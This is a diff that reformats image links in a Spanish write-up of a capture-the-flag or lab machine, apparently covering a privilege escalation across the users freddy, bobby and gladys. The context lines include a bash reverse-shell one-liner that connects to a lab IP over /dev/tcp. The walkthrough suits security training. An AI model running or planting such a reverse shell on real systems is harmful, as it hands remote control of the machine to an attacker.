@@ -87,7 +87,9 @@ Entonces me lanzo una reverse shell:
 bash -c "bash -i >& /dev/tcp/192.168.1.89/4444 0>&1"
 ```
 
-![|894](/assets/img/Anexos/Pasted%20image%2020250329200626-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250329200626-1.png)
+
+
 
 ## Escalada 
 Una vez dentro como el usuario **freddy** tenemos los siguientes usuarios en la máquina:
@@ -122,7 +124,7 @@ Y luego pongo:
 
 Como **bobby** me vi obligado a mudar de shell ya que estaba teniendo muchos problemas para la próxima escalada:
 
-![|923](/assets/img/Anexos/Pasted%20image%2020250329221321-1-1-1.png)
+![](/assets/img/Anexos/Pasted%20image%2020250329221321-1-1-1.png)
 
 Como **bobby** podemos ejecutar `php` como **gladys**
 ```shell
